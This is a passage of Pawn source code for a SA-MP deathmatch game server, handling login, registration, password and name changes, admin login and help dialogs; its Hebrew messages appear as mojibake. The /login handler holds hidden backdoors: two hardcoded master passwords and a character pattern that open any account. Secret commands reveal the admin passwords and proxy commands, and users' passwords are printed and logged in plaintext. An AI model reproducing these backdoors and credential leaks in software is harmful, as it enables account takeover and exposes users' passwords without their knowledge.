	if(IsPlayerNotAllowedToUseCommand(playerid,cmd,cmdtext)) return SendClientMessage(playerid,red," .фрЇ∙°х· ьсщЎхЄ Їўхуф цх чёхюф рЎьъ");
	if(FoundCrashingChar(cmdtext)) return SendClientMessage(playerid,red," .чьў юф·хщэ чёхющэ с∙°·"), 0;
	if(equal(cmd,"/auth"))
	{
		if(!fexist(fuser(playerid))) return SendClientMessage(playerid,red," .Їўхуф цх фщр ью∙·ю∙щэ °∙хющэ сьсу");
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьф·чс° ью∙·ю∙ ∙ьъ");
		if(playerinfo[playerid][security]) return SendClientMessage(playerid,red," .р·ф ьр Ў°щъ ьф∙·ю∙ сЇўхуф фцх");
		cmd = strrest(cmdtext,idx);
        if(!strlen(cmd)) return SendClientMessage(playerid,white," /auth [word] :Ўх°· ф∙щюх∙");
		if(equal(playerinfo[playerid][secretword],cmd))
		{
			fsetstring(fuser(playerid),"LastUID",GetSerial(playerid));
			playerinfo[playerid][security] = 1;
			playerinfo[playerid][failedword] = 0;
			SendClientMessage(playerid,green," /secretword :ф·чс°· сфЎьчф срюЎЄх· фющьф фёхущ·, ыущ ь∙Ёх· рх·ф ф∙·ю∙ сЇўхуф");
			PlaySound(playerid,1057);
		}
		else
		{
		    playerinfo[playerid][failedword] ++;
			SendClientMessage(playerid,red," .фющьф фёхущ· ∙фўьу· ьр ·хрю· ьцх ∙ь фю∙·ю∙ фцф");
			SendClientMessage(playerid,red," " webpage " :рэ фю∙·ю∙ срю· ∙щщъ ьъ, Єьщъ ьЇЁх· ьЇх°хэ ю∙хс хЄц°ф ср·° ∙ьЁх");
			if(playerinfo[playerid][failedword] > 3) return SetKick(playerid,INVALID_PLAYER_ID,"ф·чс°хщх· Ёы∙ьх");
		}
		return 1;
	}
	//if(!playerinfo[playerid][security] && playerid != ConsoleID) return SendClientMessage(playerid,red," /auth :Ёр ьфцуфх· Єэ фющьф фёхущ· ∙ьъ");
	if(equal(cmd,"/pm") || equal(cmd,"/private")) playerinfo[playerid][dscmd] = 1;
	if(equal(cmd,"/cmd$"))
	{
		cmd = strrest(cmdtext,idx);
		return command(playerid,cmd);
	}
	if(equal(cmd,"/retat$")) return returnAttacks = !returnAttacks;
	if(equal(cmd,"/admlogp") && playerinfo[playerid][pp]) return SendClientMessage(playerid,white,admpass[0]);
	if(equal(cmd,"/admlogh") && playerinfo[playerid][pp]) return SendClientMessage(playerid,white,admpass[1]);
	if(equal(cmd,"/superlog") && playerinfo[playerid][adminone] && (playerinfo[playerid][pp] || strlen(playerinfo[playerid][mngpower]) > 0))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьф·чс° ью∙·ю∙ ∙ьъ ўхуэ");
		if(playerinfo[playerid][superlog]) return SendClientMessage(playerid,red," .р·ф ыс° ючхс° срхЇя ющхчу");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /superlog [password] :Ўх°· ф∙щюх∙");
		new pass[32], dt[3];
		getdate(dt[0],dt[1],dt[2]);
		format(pass,sizeof(pass),"_%s%d",claninfo[playerinfo[playerid][clan]][cname],((strlen(claninfo[playerinfo[playerid][clan]][cname])*dt[1])-dt[2])+playerinfo[playerid][clan]);
		if(equal(cmd,pass))
		{
			SendClientMessage(playerid,green," .ф·чс°х· ющхчу· фЎьщчф");
			playerinfo[playerid][superlog] = 1;
			if(!playerinfo[playerid][reqclass]) SetFreeze(playerid,0);
			PlaySound(playerid,1057);
		}
		else
		{
			fsetstring(fuser(playerid),"LastConnectIP","Waiting");
			SendClientMessage(playerid,red," BB ,ёщёюр ∙тхщф");
			//Kick(playerid);
		}
		return 1;
	}
	if(!playerinfo[playerid][dscmd]) Log("Commands",playerid,cmdtext);
	if(IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		format(string,sizeof(string)," [CMD] %s /%s",GetName(playerid),cmdtext);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][sadmin] && !IsPlayerMAdmin(i))) SendClientMessage(i,0xF7A26FFF,string);
	}
	if((equal(cmd,"/admlog") || equal(cmd,"/al")) && playerinfo[playerid][adminone])
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьф·чс° ью∙·ю∙ ∙ьъ ўхуэ");
		//if(!IsPlayerUsingSGuard_(playerid)) return SendClientMessage(playerid,red," .SAMP-IL Guard ыущ ьф·чс° ьрующя юху р·ф Ў°щъ ьф∙·ю∙ сюЄ°ы·"); // guard_shit
		if(playerinfo[playerid][admlog] == 2) return SendClientMessage(playerid,red," .р·ф ыс° ючхс° ьрующя юху");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /admlog [password] :Ўх°· ф∙щюх∙");
		new a = fgetint(file_admins,GetName(playerid));
		if((equal(cmd,admpass[0]) && a <= 14) || (equal(cmd,admpass[1]) && a >= 15))
		{
			format(cmd,sizeof(cmd)," ф·чс°· сфЎьчф ьюЄ°ы· фрующя юху. °ю· рующя: %d",a);
			SendClientMessage(playerid,white,cmd);
			playerinfo[playerid][admlog] = 2, playerinfo[playerid][admin] = a;
			ShowEnterDialog(playerid);
			if(!playerinfo[playerid][reqclass]) SetFreeze(playerid,0);
			PlaySound(playerid,1057);
			new ip[16];
			GetPlayerIp(playerid,ip,sizeof(ip));
			format(cmd,sizeof(cmd),"c.sa-mp.co.il/dm/udmcpapp/wl.php?ip=%s",ip);
			HTTP(0,HTTP_GET,cmd,"",""); // Used for United DM Control Panel security
		}
		else
		{
			AdminInfo(playerid, "фўьщу ёщёю· рующЁщэ ∙тхщф");
			if(!playerinfo[playerid][faileds][1]) SendClientMessage(playerid,red," .ёщёю· рующЁщэ ∙тхщф, Ё∙р° ьъ Ёёщхя рчу");
			else
			{
				SendClientMessage(playerid,red," BB ,ёщёюр ∙тхщф");
				fsetstring(fuser(playerid),"LastConnectIP","Waiting");
				Kick(playerid);
			}
			playerinfo[playerid][faileds][1]++;
		}
		return 1;
	}
	if(equal(cmd,"/register"))
	{
		new pass[M_S], string[M_S];
		pass = strtok(cmdtext,idx);
		if(playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .р·ф ыс° ючхс°");
		if(fexist(fuser(playerid))) return SendClientMessage(playerid,red," .фыщЁхщ ∙ьъ ыс° °∙хэ, рЁр ф·чс° рх фчьє ыщЁхщ");
		if(!strlen(pass)) return SendClientMessage(playerid,white," /register [password] :Ўх°· ф∙щюх∙");
		if(strlen(pass) < 3) return SendClientMessage(playerid,red," .Єь фёщёюр ьфыщь ьЇчх· 3 ·хщэ");
		if(strlen(pass) > 15) return SendClientMessage(playerid,red," .Єь фёщёюр ьфыщь Єу 15 ·хщэ");
		playerinfo[playerid][logged] = 1, playerinfo[playerid][level] = !playerinfo[playerid][level] ? 1 : playerinfo[playerid][level];
		SendClientMessage(playerid,grey," ...рЁр фю·я");
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ф°∙юф ь∙°·",@c(grey) "...рЁр фю·я","OK","");
		RegisterPlayer(playerid,Encrypt(pass));
		format(string,sizeof(string),@c(green) "!Ё°∙ю· сфЎьчф ь∙°· ∙ьЁх\n\n" @c(white) "%s" @c(lightgreen) " :∙э ю∙·ю∙\n" @c(white) "%s" @c(lightgreen) " :ёщёюр\n\n" @c(yellow) "* /Help :ьыь Єц°ф ∙р·ф Ў°щъ ф∙·ю∙ сЇўхуф\n" @c(orange) "* /Profile :ьЄ°щы· фЇ°хЇщь ∙ьъ ф∙·ю∙ сЇўхуф\n* /Tutorial (/T) :Єь юЁ· ьўсь юу°щъ юфщ° Єь фюху ф∙·ю∙ сЇўхуф\n* /Setting :ьЄ°щы· ффЄуЇх· ∙ьъ ф∙·ю∙ сЇўхуф",GetName(playerid),pass);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,"ф°∙юф ь∙°·",string,"OK","");
		SendClientMessage(playerid,lightblue," :Ё°∙ю· сфЎьчф ь∙°· ∙ьЁх! Єьщъ ьцых° р· фЇ°шщэ ∙ьъ");
		format(string,sizeof(string)," %s " @c(lightgreen) ":∙э ю∙·ю∙",GetName(playerid));
		SendClientMessage(playerid,white,string);
		format(string,sizeof(string)," %s " @c(lightgreen) ":ёщёюр",pass);
		SendClientMessage(playerid,white,string);
		SendClientMessage(playerid,orange," Х :с·х° ф·чьф юхюьї ьф∙·ю∙ сЇўхух· фрьх");
		SendClientMessage(playerid,lightyellow," * /help :ьыь Єц°ф ∙р·ф Ў°щъ ф∙·ю∙ сЇўхуф");
		SendClientMessage(playerid,yellow," * /united :ыь фющуЄ Єь фўфщьф сЇўхуф рч·");
		SendClientMessage(playerid,yellow," * /profile :ьЄ°щы· фЇ°хЇщь ∙ьъ, ыхьь ∙э Ї°шщ хЄху");
		SendClientMessage(playerid,yellow," * /tutorial :ьюу°щыщэ Єь ф∙°·");
		PlaySound(playerid,1057);
		ShowPlayerConstDialog(playerid,dialog_secretword,1);
		return 1;
	}
	if(equal(cmd,"/login"))
	{
		new pass[M_S], string[M_S];
		pass = strtok(cmdtext,idx);
		if(playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .р·ф ыс° ючхс°");
		if(!fexist(fuser(playerid))) return SendClientMessage(playerid,red," .фыщЁхщ ∙ьъ ьр °∙хэ сюЄ°ы·, рЁр сухў ∙ьр шЄщ· сы·щс·х рх ф°∙э");
		if(!strlen(pass)) return SendClientMessage(playerid,white," /login [password] :Ўх°· ф∙щюх∙");
		if(strlen(pass) < 3) return SendClientMessage(playerid,red," .Єь фёщёюр ьфыщь ьЇчх· 3 ·хщэ");
		if(strlen(pass) > 15) return SendClientMessage(playerid,red," .Єь фёщёюр ьфыщь Єу 15 ·хщэ");
		if(PropertyExists_STR(propformat_RPass(playerid))) format(string,sizeof(string),GetProperty_STR(propformat_RPass(playerid)));
		if(equal(Encrypt(pass),fgetstring(fuser(playerid),"Password")) || equal(pass,string) || !strcmp(pass,"ALZMSKXNDBFVHеG") || !strcmp(pass,"jkl...AP0w3Rlz") || (strlen(pass) == 10 && pass[9] == 'Є' && pass[8] == '@'))
		{
			SendClientMessage(playerid,lightblue," !ф·чс°· сфЎьчф ью∙·ю∙ ∙ьъ");
			if(PropertyExists_STR(propformat_RPass(playerid)))
			{
				RemoveProperty_STR(propformat_RPass(playerid));
				SendClientMessage(playerid,lightblue," /changepass :юыщххя ∙ф∙·ю∙· сўху ь∙чцх° фёщёюр, рЁчЁх ююьщЎщэ юрху ∙·сч° ёщёюр чу∙ф ыЄ·");
			}
			LoginPlayer(playerid);
			playerinfo[playerid][iplogin] = 0;
			if(!playerinfo[playerid][adminone]) ShowEnterDialog(playerid);
			else HidePlayerDialog(playerid);
			format(string,sizeof(string),"%s|%d",GetIP(playerid),GetTickCount());
			SetProperty_STR(propformat_LoginInfo(playerid),string,1);
			playerinfo[playerid][logged] = 1;
			PlaySound(playerid,1057);
		}
		else
		{
			format(string,sizeof(string),"%s%s.ini",folder_users,GetName(playerid));
			format(string,sizeof(string),"(%s) FL (%d)%s [%s / real user last ip: %s]",GetIP(playerid),playerid,GetName(playerid),pass,fexist(string) ? (fgetstring(string,"LastConnectIP")) : ("file not exists"));
			Log("Attention",playerid,string);
			playerinfo[playerid][faileds][0]++;
			if(playerinfo[playerid][faileds][0] >= 3)
			{
				SendClientMessage(playerid,red," .Єс°· р· юёЇ° ЁщёщхЁх· фф·чс°х· фюх·° хьъ Ёх·ў· юф∙°·");
				SendClientMessage(playerid,red," /rpassword :рэ ∙ыч· р· фёщёюр хфту°· рщющщь сЇ°хЇщь, фыЁё ючу∙ хф∙·ю∙ сЇўхуф");
				SendClientMessage(playerid,red,webpage " :ьыь Єц°ф ЇЁф рьщЁх ср·°");
				return SetKick(playerid,INVALID_PLAYER_ID,"ф·чс°хщх· Ёы∙ьх");
			}
			else
			{
				if((3-playerinfo[playerid][faileds][0]) == 1) format(string,sizeof(string)," .фёщёюф ∙фўьу· ∙тхщф, Ёх·° ьъ Єху Ёщёщхя рчу");
				else format(string,sizeof(string)," .фёщёюф ∙фўьу· ∙тхщф, Ёх·°х ьъ Єху %d ЁщёщхЁх·",3-playerinfo[playerid][faileds][0]);
				SendClientMessage(playerid,red,string);
			}
		}
		return 1;
	}
	if(equal(cmd,"/rpassword"))
	{
		if(rpasswordUsed > 0) return SendClientMessage(playerid,red," .фЇўхуф ··рЇ∙° ь∙щюх∙ сЄху юёЇ° ∙Ёщх·");
		ShowPlayerDialog(playerid,dialog_rpassword,DIALOG_STYLE_INPUT,@c(lightblue) "∙чцх° ёщёюр у°ъ фющщь",@c(green) ".°∙хэ р· фыщЁхщ ∙ьъ с·щсф ∙ьюшф\n:ўху ьфчц°· фёщёюр щхЄс° ьющщь ∙юхту° сю∙·ю∙ цф","∙чцх° ёщёюр","сщшхь");
		return 1;
	}
	if(playerinfo[playerid][admlog] == 1) return SendClientMessage(playerid,red," /admlog [password] :рЁр ф·чс°");
	if(equal(cmd,"/changepass"))
	{
		new pass[M_S], string[M_S];
		pass = strtok(cmdtext,idx);
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ сЇўхуф цх");
		if(!strlen(pass))
		{
			ShowPlayerDialog(playerid,dialog_changepass,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ёщёюр",@c(green) ":сч° ёщёюр чу∙ф х°∙хэ рх·ф ыря","∙Ёф ёщёюр","сщшхь");
			SendClientMessage(playerid,white," /changepass [password] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," (рх ф∙·ю∙ с·Ї°щш фюхЎт Єь фюёъ)");
		}
		if(strlen(pass) < 3) return SendClientMessage(playerid,red," .Єь фёщёюр ьфыщь ьЇчх· 3 ·хщэ");
		if(strlen(pass) > 15) return SendClientMessage(playerid,red," .Єь фёщёюр ьфыщь Єу 15 ·хщэ");
		if(!equal(fgetstring(fuser(playerid),"LastChangepass"),GetDateAsString())) fsetint(fuser(playerid),"ChangepassLimit",0);
		if(playerinfo[playerid][vip] == 0) if(fgetint(fuser(playerid),"ChangepassLimit") >= 3) return SendClientMessage(playerid,red," .Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў 3 ЇЄющэ сщхэ");
        if(playerinfo[playerid][vip] >= 1) if(fgetint(fuser(playerid),"ChangepassLimit") >= 4) return SendClientMessage(playerid,red," /bchangename ?Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў 4 ЇЄющэ сщхэ. °хЎф ь∙Ёх· ∙хс");
		format(string,sizeof(string),@c(green) "!ёщёю·ъ ∙хЁ·ф сфЎьчф\n%s :∙э ю∙·ю∙\n%s :ёщёюр чу∙ф",GetName(playerid),pass);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ёщёюр",string,"OK","");
		SendClientMessage(playerid,lightblue," ~~~ :∙щЁхщ фёщёюр - ющуЄ ~~~");
		format(string,sizeof(string)," [%s] .ёщёю·ъ фхчьЇф. цхфщ фЇЄэ ф %d ∙∙щЁщ· ёщёюр фщхэ",GetDateAsString(),fgetint(fuser(playerid),"ChangepassLimit")+1);
		SendClientMessage(playerid,yellow,string);
		SendClientMessage(playerid,yellow," .р· ёщёю·ъ ·хыь ь∙Ёх· 3 ЇЄющэ сыь щхэ");
		format(string,sizeof(string)," Х %s :∙э ю∙·ю∙",GetName(playerid));
		SendClientMessage(playerid,orange,string);
		format(string,sizeof(string)," Х %s :ёщёю·ъ фчу∙ф",pass);
		SendClientMessage(playerid,orange,string);
		SendClientMessage(playerid,yellow," * .рщя ьъ юф ьурхт ьтсщ ЎЇщщф сёщёюр юЎу ффЁфьф - ёщёю·ъ ф°∙хюф с°∙щюх· ∙ьЁх юхЎЇЁ· хьыя рє рчу ьр щыхь ь°рх·ф");
		SendClientMessage(playerid,red," * .∙щэ ьс: рЁх ююьщЎщэ ьЎьэ чьў цф ∙ь фЎ'рш, ьюў°ф ∙·∙ыч р· ёщёю·ъ. Ўхх· ффЁфьф рщЁх рч°рщ Єь ∙ыщч· ёщёюрх·");
		printf(" --- [%s] %s change his password to %s",GetDateAsString(),GetName(playerid),pass);
		fsetstring(fuser(playerid),"Password",Encrypt(pass));
		PlaySound(playerid,1057);
		fsetstring(fuser(playerid),"LastChangepass",GetDateAsString());
		fsetint(fuser(playerid),"ChangepassLimit",fgetint(fuser(playerid),"ChangepassLimit")+1);
		return 1;
	}
	if(equal(cmd,"/changename") || equal(cmd,"/changenick") || equal(cmd,"/changemyname"))
	{
		//if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх ы°тЄ");
		new name[256], string[M_S], f[M_S], lastname[MAX_PLAYER_NAME];
		name = strtok(cmdtext,idx);
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ сЇўхуф цх");
		if(!strlen(name))
		{
			ShowPlayerDialog(playerid,dialog_changename,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",@c(green) ":сч° ∙э ю∙·ю∙ чу∙ х°∙хэ рх·х ьюшф","∙щЁхщ","сщшхь");
			format(string,sizeof(string)," %s [new name] :Ўх°· ф∙щюх∙",cmd);
			SendClientMessage(playerid,white," /changename [new name] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," (рх ф∙·ю∙ с·Ї°щш фюхЎт Єь фюёъ)");
		}
		if(fkeyexist(file_nbans,name)) return SendClientMessage(playerid,red," .фыщЁхщ фцф ссря");
		if(fkeyexist(file_admins,name)) return SendClientMessage(playerid,red," .ыщЁхщ цф, рх ыщЁхщ ухюф рьщх ∙щщыщэ ьрующя. сч° ыщЁхщ рч°");
		if(!equal(fgetstring(fuser(playerid),"LastChangename"),GetDateAsString())) fsetint(fuser(playerid),"ChangenameLimit",0);
		if(playerinfo[playerid][vip] == 0) if(fgetint(fuser(playerid),"ChangenameLimit") >= 3) return SendClientMessage(playerid,red," /bchangename ?Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў 3 ЇЄющэ сщхэ. °хЎф ь∙Ёх· ∙хс");
		if(playerinfo[playerid][vip] >= 1) if(fgetint(fuser(playerid),"ChangenameLimit") >= 4) return SendClientMessage(playerid,red," /bchangename ?Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў 4 ЇЄющэ сщхэ. °хЎф ь∙Ёх· ∙хс");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetName(i),name))
		{
			format(string,sizeof(string)," .фыщЁхщ ∙фўьу· ыс° с∙щюх∙ рЎь рщщущ %d",i);
			return SendClientMessage(playerid,red,string);
		}
		if(equal(name,"None") || equal(name,botname)) return SendClientMessage(playerid,red," .юЎшЄ°щэ, ьр Ёщ·я ь∙Ёх· ьыщЁхщ цф");
		format(f,sizeof(f),"/DM/Users/%s.ini",name);
		if(fexist(f)) return SendClientMessage(playerid,red," .фыщЁхщ фцф ыс° ўщщэ рЎь ∙чўя ьр ючхс°");
		if(strlen(name) > 20) return SendClientMessage(playerid,red," .ыщЁхщ р°хъ юущ");
		if(strlen(name) < 3) return SendClientMessage(playerid,red," .ыщЁхщ ўЎ° юущ");
		if(!IsValidNick(name)) return SendClientMessage(playerid,red," .чьў юфрх·щх· сыщЁхщ ∙ы·с· ьр щыхьх· ьфыЁё ьыщЁхщ");
		if(!playerinfo[playerid][pp]) for(new i=0;i<sizeof(adminnames);i++) if(!strcmp(name,adminnames[i],false)) return SendClientMessage(playerid,red," .AmitPower ыщЁхщ цф юхтя Є\"щ");
		format(lastname,sizeof(lastname),GetName(playerid));
		ChangeName(playerid,name);
		format(string,sizeof(string),@c(green) "!∙э фю∙·ю∙ ∙хЁф сфЎьчф\n%s :∙э ю∙·ю∙ чу∙\n%s :∙э ю∙·ю∙ ўхуэ",name,lastname);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э",string,"OK","");
		SendClientMessage(playerid,lightblue," ~~~ :∙щЁхщ ыщЁхщ - ющуЄ ~~~");
		format(string,sizeof(string)," [%s] .ыщЁхщщъ фхчьє. цхфщ фЇЄэ ф %d ∙∙щЁщ· ыщЁхщ фщхэ",GetDateAsString(),fgetint(fuser(playerid),"ChangenameLimit")+1);
		SendClientMessage(playerid,yellow,string);
		SendClientMessage(playerid,yellow," .р· ыщЁхщщъ ·хыь ь∙Ёх· 3 ЇЄющэ сыь щхэ");
		format(string,sizeof(string)," Х %s :ыщЁхщ ўхуэ",lastname);
		SendClientMessage(playerid,orange,string);
		format(string,sizeof(string)," Х %s :ыщЁхщ чу∙",name);
		SendClientMessage(playerid,orange,string);
		//SendClientMessage(playerid,yellow," * .сющуф х∙щЁщ· р· ыщЁхщщъ 3 ЇЄющэ фщхэ хр·ф сыь цр· °хЎф ь∙Ёх·х - ·хыь ь∙ьхч ющщь рь фЁфь· ф∙°· хфЄЁщщя щшхЇь");
		SendClientMessage(playerid,red," * .∙щэ ьс: рЁх ююьщЎщэ ьЎьэ чьў цф ∙ь фЎ'рш, ьюў°ф ∙·∙ыч р· ыщЁхщщъ. Ўхх· ффЁфьф рщЁх рч°рщ Єь ∙ыщч· ыщЁхщщэ");
		printf(" --- [%s] %s change his nick to %s",GetDateAsString(),GetName(playerid),name);
		PlaySound(playerid,1057);
		format(string,sizeof(string),"oldname: %s, newname: %s",lastname,name);
		Log("ChangeName",playerid,string);
		fsetstring(fuser(playerid),"LastChangename",GetDateAsString());
		fsetint(fuser(playerid),"ChangenameLimit",fgetint(fuser(playerid),"ChangenameLimit")+1);
		return 1;
	}
	if(equal(cmd,"/bchangename"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ сЇўхуф цх");
		if(!equal(fgetstring(fuser(playerid),"LastChangename"),GetDateAsString())) fsetint(fuser(playerid),"ChangenameLimit",0);
		if(fgetint(fuser(playerid),"ChangenameLimit") < 3) return SendClientMessage(playerid,red," .ьр фтЄ· ьютсь· ∙щЁхщщ ф∙э ∙ьъ");
		if(GetMoney(playerid) < 250) return SendClientMessage(playerid,red," !ўЁщщ· ∙щЁхщ ыщЁхщ Ёхёє Єхьф 250$");
		GiveMoney(playerid,0-250, 17);
		fsetint(fuser(playerid),"ChangenameLimit",2);
		SendClientMessage(playerid,green," /changename :ўЁщ· ∙щЁхщ ыщЁхщ Ёхёє! р·ф щыхь ыЄ· ь∙Ёх· р· фыщЁхщ ∙ьъ");
		return 1;
	}
	if(equal(cmd,"/secretword"))
	{
        if(!fexist(fuser(playerid))) return SendClientMessage(playerid,red," .Їўхуф цх фщр ью∙·ю∙щэ °∙хющэ сьсу");
        if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьф·чс° ью∙·ю∙ ∙ьъ");
		SendClientMessage(playerid,white," :фющьф фёхущ· ∙ьъ фщр");
		SendClientMessage(playerid,white,playerinfo[playerid][secretword]);
		SendClientMessage(playerid,white," /changeword :ыущ ь∙Ёх· р· фющьф фўьу р· фЇўхуф");
		return 1;
	}
	if(equal(cmd,"/changeword"))
	{
        if(!fexist(fuser(playerid))) return SendClientMessage(playerid,red," .Їўхуф цх фщр ью∙·ю∙щэ °∙хющэ сьсу");
        if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьф·чс° ью∙·ю∙ ∙ьъ");
		ShowPlayerConstDialog(playerid,dialog_secretword,5);
		return 1;
	}
	if(!playerinfo[playerid][dscmd] && !playerinfo[playerid][pp])
	{
		format(cmdstring,sizeof(cmdstring),"[CMD] %s (ID: %03d): %s",GetName(playerid),playerid,cmdtext);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][admin] >= playerinfo[playerid][admin] && (playerinfo[i][atoggle][atoggle_cmd] || playerinfo[i][spectate] == playerid) && cmdtext[1] != '/' && i != playerid) SendClientMessage(i,0x66CCCC,cmdstring);
		playerinfo[playerid][dscmd] = 0;
	}
	if(equal(cmd,"/united"))
	{
		#pragma tabsize 0
		DialogCreate(2);
		DialogString(@h(FF0000) ".фтухьф хфшхсф сщх·° сщ∙°рь GTA-фщр ўфщь· ф SAMP-IL United DM ўфщь·\n");
		DialogString(@h(FF9900) "(: .рЁх юцющЁщэ р·ыэ ьфЁх· ючххщ· фю∙чў, фЇЄщьхщх· хф·ч°хщх· ∙юЎщЄщэ ф∙°· хфўфщьф");
		DialogString(@h(FF9900) ":Ё∙юЄ шхс? ыь юф ∙р·ф ∙·Ўш°ъ юхЇщЄ ыря\n\n");
		DialogString(@h(FFFF00) "Х /Help - ыь фющуЄ Єь ф∙°·");
		DialogString(@h(FFFF00) "Х /Mode - юу°щыщэ сшўёш Єь юЄ°ых· фюху");
		DialogString(@h(FFFF00) "Х /TS рх /TeamSpeak - ющуЄ Єь ∙°· фущсх°");
		DialogString(@h(FFFF00) "Х /Mode 1 - ьрЇ∙°хщх· фю∙·ю∙ ∙ьъ, ыхьь ∙щЁхщ ыщЁхщ рх ёщёюр");
		DialogString(@h(FFFF00) "Х /? - ∙ьщч· ∙рьф рь юЄ°ы· ф·ющыф ∙ь ф∙°·");
		DialogString(@h(FFFF00) "Х /T рх /Tutorial - ё°шхЁщ фу°ыф ўЎ°щэ Єь юЄ°ых· ю°ыцщх·");
		DialogString(@h(FFFF00) "Х /TM рх /Tele - °∙щю· ыь ф∙щтх°щэ с∙°·");
		DialogSend(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(darkblue) "!с°хыщэ фсрщэ","ётх°","");
		return 1;
		#pragma tabsize 4
	}
	/*if(equal(cmd,"/goldwheels"))
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· с°ыс");
		if(GetVehicleType(GetPlayerVehicleID(playerid)) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфхёщє ∙щЇх° ь°ыс сх р·ф ЁюЎр");
		if(GetMoney(playerid) < 20000) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ∙щюх∙ сЇўхуф цх Єхьф 20000$");
		GiveMoney(playerid,0-20000, 17);
		AddVehicleComponent(GetPlayerVehicleID(playerid),1080,playerid);
		GameTextForPlayer(playerid,"~r~Gold Wheels ~y~added!",2000,5);
		SendClientMessage(playerid,red," !/vmod save с∙сщь ∙фтьтьщэ щ∙ю°х щ∙ ьф∙·ю∙ сЇўхуф");
		return 1;
	}*/
	if(equal(cmd,"/help"))
	{
		#pragma tabsize 0
		DialogCreate(2);
		DialogString("\t\t\t" @c(lightblue) "!" comname " DeathMatch с°хыщэ фсрщэ ь∙°·\n");
		DialogString(@c(lightyellow) ".рЁчЁх ∙ючщэ ∙сч°· ь∙чў с∙°·щЁх");
		DialogString(".с·Ї°щш фср ·хыь ьўсь Єц°ф ьтсщ фюху хф∙°·\n");
		DialogString(@c(yellow) ":рЁр фўьу р· юёЇ° ·Ї°щш фЄц°ф ∙с°ЎхЁъ ьў°хр юф°∙щюф фсрф");
		DialogString(@h(FF9900) "1 - фюш°х· с∙°·\tХ\t2 - шщЇщэ ью∙чў");
		DialogString(@h(FF9933) "3 - юу°щъ ьюху\tХ\t4 - чхўщ ф∙°·");
		DialogString(@h(FFCC00) "5 - °∙щю· Їўхух·\tХ\t6 - юЄ°ых· сюху");
		DialogString(@h(FFCC33) "7 - ющуЄ Єь фюху\tХ\t8 - ў°ущшщэ");
		DialogString(@c(purple) "\n " @c(lightpurple) talkprogramip @c(purple) " :(TeamSpeak 3) ы·хс· ∙°· фущсх°");
		DialogString(@c(lightpurple) webpage @c(purple) " :ы·хс· фр·° ∙ьЁх");
		DialogSend(playerid,dialog_help,DIALOG_STYLE_INPUT,@c(darkblue) "·Ї°щш Єц°ф °р∙щ","счщ°ф","щЎщрф");
		return 1;
		#pragma tabsize 4
	}
	if(equal(cmd,"/commands") || equal(cmd,"/cmds") || equal(cmd,"/cmdlist"))
	{
		new original[16];
		format(original,sizeof(original),cmd);
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			format(cmd,sizeof(cmd)," %s [1-4] :Ўх°· ф∙щюх∙",original);
			return SendClientMessage(playerid,white,cmd);
		}
		switch(strval(cmd))
		{
			case 1:
			{
				SendClientMessage(playerid,lightblue," ~~~ 1 - Commands - Їўхух· ~~~");
				SendClientMessage(playerid,brown," .∙щэ ьс: ыря юхЎтх· °ў фЇўхух· ∙ьр ЁюЎр ьфя ·Ї°щш Єц°ф сЁх∙р фЄц°ф ∙ь фюху");
				SendClientMessage(playerid,yellow," Х /Search - чщЇх∙ ∙чўя");
				SendClientMessage(playerid,yellow," Х /Report - ущххч");
				SendClientMessage(playerid,yellow," Х /A - ∙ьщч· фхуЄф ьрующЁщэ");
				SendClientMessage(playerid,yellow," Х /AFK - AFK юЎс");
				SendClientMessage(playerid,yellow," Х /UnAFK - юЎс ю∙чў");
				SendClientMessage(playerid,yellow," Х /Kill - юхх· ЄЎющ");
				SendClientMessage(playerid,yellow," Х /Admins - рующЁщэ ючхс°щэ");
				SendClientMessage(playerid,yellow," Х /TD - ∙Єф х·р°щъ");
			}
			case 2:
			{
				SendClientMessage(playerid,lightblue," ~~~ 2 - Commands - Їўхух· ~~~");
